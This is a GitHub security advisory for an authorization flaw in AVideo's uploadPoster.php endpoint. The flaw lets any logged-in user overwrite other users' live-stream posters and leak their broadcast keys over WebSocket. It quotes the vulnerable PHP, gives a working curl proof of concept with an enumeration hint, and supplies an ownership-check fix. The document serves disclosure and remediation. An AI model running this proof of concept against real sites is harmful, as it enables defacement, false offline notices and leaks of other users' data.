# [M] AVideo: IDOR in uploadPoster.php Allows Any Authenticated User to Overwrite Scheduled Live Stream Posters and Trigger False Socket Notifications

## Summary
Severity: Medium
Advisory: GHSA-g3hj-mf85-679g
CVE: CVE-2026-34247
CWE: CWE-862
Ecosystem: Packagist
CVSS: CVSS:3.1/AV:N/AC:L/PR:L/UI:N/S:U/C:L/I:L/A:N (CVSS_V3)
Published: 2026-03-29
Source: https://github.com/advisories/GHSA-g3hj-mf85-679g
Type: github-advisory

## Affected
- Packagist: `wwbn/avideo` — affected >=0

## Details
## Summary

The `plugin/Live/uploadPoster.php` endpoint allows any authenticated user to overwrite the poster image for any scheduled live stream by supplying an arbitrary `live_schedule_id`. The endpoint only checks `User::isLogged()` but never verifies that the authenticated user owns the targeted schedule. After overwriting the poster, the endpoint broadcasts a `socketLiveOFFCallback` notification containing the victim's broadcast key and user ID to all connected WebSocket clients.

## Details

The vulnerable endpoint at `plugin/Live/uploadPoster.php` accepts a `live_schedule_id` from `$_REQUEST` and uses it to determine poster file paths and trigger socket notifications without ownership validation.

**Entry point — attacker-controlled input (line 11-12):**
```php
$live_servers_id = intval($_REQUEST['live_servers_id']);
$live_schedule_id = intval($_REQUEST['live_schedule_id']);
```

**Insufficient auth check (line 14-17):**
```php
if (!User::isLogged()) {
    $obj->msg = 'You cant edit this file';
    die(json_encode($obj));
}
```

This only verifies the user is logged in. There is no check that `User::getId()` matches the schedule owner's `users_id`.

**Poster path resolved by ID alone (line 40-42):**
```php
$paths = Live_schedule::getPosterPaths($live_schedule_id, 0);
$obj->file = str_replace($global['systemRootPath'], '', $paths['path']);
$obj->fileThumbs = str_replace($global['systemRootPath'], '', $paths['path_thumbs']);
```

`getPosterPaths()` is a static method that constructs file paths purely from the numeric ID with no authorization.

**Attacker's file overwrites victim's poster (line 48):**
```php
if (!move_uploaded_file($_FILES['file_data']['tmp_name'], $tmpDestination)) {
```

**Broadcast to all WebSocket clients (line 67-73):**
```php
if (!empty($live_schedule_id)) {
    $ls = new Live_schedule($live_schedule_id);
    $array = setLiveKey($ls->getKey(), $ls->getLive_servers_id());
    $array['users_id'] = $ls->getUsers_id();
    $array['stats'] = getStatsNotifications(true);
    Live::notifySocketStats("socketLiveOFFCallback", $array);
}
```

The `Live_schedule` constructor (inherited from `ObjectYPT`) loads data by ID with no auth checks. `Live::notifySocketStats()` calls `sendSocketMessageToAll()` which broadcasts to every connected WebSocket client.

**Notably, the parallel endpoints DO have ownership checks:**
- `plugin/Live/view/Live_schedule/uploadPoster.php` (line 18-21) checks `$row->getUsers_id() != User::getId()`
- `plugin/Live/uploadPoster.json.php` (line 24-27) checks `User::isAdmin() || $row->getUsers_id() == User::getId()`

This proves the missing check in `uploadPoster.php` is an oversight, not by-design.

## PoC

```bash
# Step 1: Log in as a low-privilege user to get a session cookie
curl -c cookies.txt -X POST 'https://target.com/objects/login.json.php' \
  -d 'user=attacker@example.com&pass=attackerpassword'

# Step 2: Overwrite the poster for live_schedule_id=1 (owned by a different user)
curl -b cookies.txt \
  -F 'file_data=@malicious.jpg' \
  -F 'live_schedule_id=1' \
  -F 'live_servers_id=0' \
  'https://target.com/plugin/Live/uploadPoster.php'

# Expected: 403 or ownership error
# Actual: {} (success) — poster overwritten, socketLiveOFFCallback broadcast sent

# Step 3: Verify the poster was replaced
curl -o - 'https://target.com/videos/live_schedule_posters/schedule_1.jpg' | file -
# Output confirms attacker's image now serves as the victim's poster

# The socketLiveOFFCallback broadcast (received by all WebSocket clients) contains:
# { "key": "<victim_broadcast_key>", "users_id": <victim_user_id>, "stats": {...} }
```

Schedule IDs are sequential integers and can be enumerated trivially.

## Impact

1. **Content tampering:** Any authenticated user can overwrite poster images on any scheduled live stream. This enables defacement or phishing (e.g., replacing a poster with a malicious redirect image).
2. **False offline notifications:** The `socketLiveOFFCallback` broadcast misleads all connected viewers into thinking the victim's stream went offline, disrupting the victim's audience.
3. **Information disclosure:** The broadcast leaks the victim's `users_id` and broadcast key to all connected WebSocket clients.
4. **Enumerable targets:** Schedule IDs are sequential integers, so an attacker can trivially enumerate and target all scheduled streams.

## Recommended Fix

Add an ownership check after the login verification at line 17 in `plugin/Live/uploadPoster.php`:

```php
if (!User::isLogged()) {
    $obj->msg = 'You cant edit this file';
    die(json_encode($obj));
}

// Add ownership check for scheduled live streams
if (!empty($live_schedule_id)) {
    $ls = new Live_schedule($live_schedule_id);
    if ($ls->getUsers_id() != User::getId() && !User::isAdmin()) {
        $obj->msg = 'Not authorized';
        die(json_encode($obj));
    }
}
```

This mirrors the existing authorization pattern already used in `uploadPoster.json.php` (line 24) and `view/Live_schedule/uploadPoster.php` (line 18).

## References
- https://github.com/WWBN/AVideo/security/advisories/GHSA-g3hj-mf85-679g
- https://nvd.nist.gov/vuln/detail/CVE-2026-34247
- https://github.com/WWBN/AVideo/commit/5fcb3bdf59f26d65e203cfbc8a685356ba300b60
- https://github.com/WWBN/AVideo
